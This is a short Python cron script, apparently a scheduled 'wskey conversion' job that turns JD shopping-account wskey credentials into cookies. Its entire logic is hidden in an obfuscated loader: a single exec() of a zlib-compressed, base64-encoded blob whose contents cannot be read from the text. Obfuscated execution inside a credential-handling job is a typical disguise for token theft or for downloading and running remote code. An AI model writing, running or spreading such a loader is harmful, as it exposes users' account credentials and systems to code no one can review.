# -*- coding: utf-8 -*
'''
cron: 15 */6 * * * wskey.py
new Env('wskey转换');
'''
import zlib, base64
exec(zlib.decompress(base64.b64decode('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')))
